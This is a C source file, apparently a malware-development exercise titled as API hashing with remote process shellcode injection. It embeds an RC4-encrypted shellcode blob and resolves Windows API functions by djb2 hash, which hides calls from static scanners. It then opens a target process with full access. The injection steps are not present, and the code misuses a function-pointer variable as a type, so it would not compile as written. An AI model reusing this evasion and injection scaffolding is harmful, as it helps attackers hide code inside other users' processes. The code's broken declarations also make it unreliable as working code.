/*
    T3: API Hashing with Remote Process Shellcode Injection
    Payload Enc: rc4
    Payload Obs: None
*/
#include <windows.h>
#include <stdio.h>
#include <winnt.h>
#include <tlhelp32.h>

unsigned char shellcode[] = {0x50, 0x88, 0x9d, 0x68, 0xa2, 0xff, 0x4d, 0x09, 0xbd, 0x88, 0x47, 0x53, 0xc8, 0xff, 0x40, 0x2d, 0x57, 0xaa, 0xe1, 0xa1, 0xa6, 0x47, 0xad, 0x6f, 0x24, 0x3f, 0x93, 0x03, 0x6d, 0x43, 0xbc, 0xac, 0x87, 0xd9, 0xbc, 0x6a, 0xfa, 0x9f, 0xb3, 0xf6, 0x4c, 0x43, 0xf5, 0x00, 0x19, 0x04, 0xc6, 0x1a, 0x21, 0x74, 0x62, 0x83, 0x34, 0x10, 0x36, 0x11, 0x18, 0xb6, 0xe2, 0xe3, 0x82, 0x89, 0xe9, 0x90, 0xab, 0x1a, 0xe9, 0xcb, 0x89, 0xe0, 0xed, 0x5f, 0xb8, 0x63, 0xe7, 0xad, 0xf8, 0x46, 0x7a, 0xbf, 0xbe, 0x99, 0x36, 0x64, 0x44, 0x08, 0x71, 0x6b, 0x53, 0x11, 0x35, 0xb8, 0x1d, 0xff, 0x10, 0x82, 0x00, 0x9e, 0x96, 0x4d, 0x81, 0xbb, 0x6a, 0xec, 0x41, 0xea, 0xd5, 0xac, 0xc0, 0x06, 0x60, 0xff, 0xfb, 0xf8, 0x56, 0xc8, 0x2d, 0xde, 0xde, 0x3c, 0x8c, 0x06, 0x16, 0x24, 0x5f, 0x0c, 0x28, 0x3f, 0x49, 0xd0, 0xfa, 0xdf, 0xec, 0x15, 0xbe, 0xa0, 0x74, 0x82, 0x49, 0xb0, 0x91, 0x58, 0x51, 0x0d, 0xa6, 0xcc, 0x16, 0x1e, 0x56, 0x0a, 0xfa, 0xbf, 0x3b, 0x21, 0x0b, 0x98, 0xa1, 0xb6, 0x04, 0xbe, 0xcc, 0x2b, 0x29, 0xd2, 0xe2, 0x77, 0x57, 0x33, 0x75, 0xc2, 0xaa, 0x47, 0xee, 0x62, 0xab, 0x78, 0x90, 0x5b, 0x9f, 0x14, 0x4b, 0xe3, 0x4d, 0x32, 0x7c, 0x57, 0x32, 0x09, 0x8c, 0x08, 0xd3, 0x04, 0x3c, 0xe5, 0x72, 0xd2, 0x33, 0xbd, 0xb6, 0x68, 0x76, 0x67, 0x8e, 0xff, 0x3d, 0x0f, 0xc7, 0xbd, 0x7d, 0x10, 0x7b, 0x9c, 0x0e, 0xc9, 0x99, 0x75, 0xf2, 0x98, 0xa4, 0x8b, 0xf6, 0xfd, 0x68, 0x08, 0x0c, 0x36, 0xc4, 0x86, 0x56, 0xaa, 0x03, 0x03, 0x14, 0x64, 0x67, 0x34, 0xba, 0x36, 0x90, 0x21, 0xbd, 0x9a, 0x67, 0x7d, 0x86, 0xda, 0xdd, 0x71, 0xfd, 0xea, 0x6d, 0x06, 0x5e, 0xf6, 0x47, 0x36, 0xdc, 0x14, 0xd8, 0x86, 0xf5, 0x88, 0xcd, 0x0e, 0xdc, 0x15, 0xbf, 0xb6, 0x24, 0x1e, 0x46, 0xee, 0x60, 0x0a, 0xaa, 0x0c};

unsigned long hash_djb2(unsigned char *str){
    unsigned long hash = 5381;
    int c;
    while (c = *str++){
        hash = ((hash << 5) + hash) + c; /* hash * 33 + c */
    }
    return hash;
}

void* GetFuncAddress(HMODULE dll_handle, char* hashed_function_name) {
    PIMAGE_DOS_HEADER p_DOS_HDR  = (PIMAGE_DOS_HEADER) dll_handle;
    PIMAGE_NT_HEADERS p_NT_HDR = (PIMAGE_NT_HEADERS) ((LPBYTE)dll_handle + p_DOS_HDR->e_lfanew); // NT HEADERS start at the raw offset defined in the e_lfanew header

    PIMAGE_EXPORT_DIRECTORY peat = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)dll_handle + p_NT_HDR->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);


    DWORD numberOfNames = peat->NumberOfNames;
    DWORD* functions_address = (DWORD*)((LPBYTE)dll_handle + peat->AddressOfFunctions);
    DWORD* functions_names = (DWORD*)((LPBYTE)dll_handle + peat->AddressOfNames);
    WORD*  functions_ordinal = (WORD*)((LPBYTE)dll_handle + peat->AddressOfNameOrdinals);
    
    for(size_t i=0; i < numberOfNames; i++) {
        char hash_str[100];
        char *name = (char*)dll_handle + functions_names[i];
        unsigned long hash = hash_djb2(name);
        sprintf(hash_str, "%lu", hash);
        if (strcmp(hashed_function_name, hash_str) == 0) {
            printf("function %s found into %s !\n", name, (char*)dll_handle + peat->Name);
            return (LPBYTE)dll_handle + functions_address[functions_ordinal[i]];
        }
    }
    return NULL;
}

HANDLE (WINAPI* pOProcess)(
    DWORD dwDesiredAccess,
    BOOL  bInheritHandle,
    DWORD dwProcessId
);

int main(int argc, char* argv[]){
    HMODULE dllhandle = GetModuleHandle("kernel32.dll");
    if (dllhandle == NULL){
        printf("Failed to find kernel32.dll\n");
        return EXIT_FAILURE;
    }
    DWORD pid = atoi(argv[1]);

    //Get a Handle on the target process
    pOProcess OProcess = (pOProcess)GetFuncAddress(dllhandle, "1899429334");
    HANDLE hProcess = OProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    return EXIT_SUCCESS;
}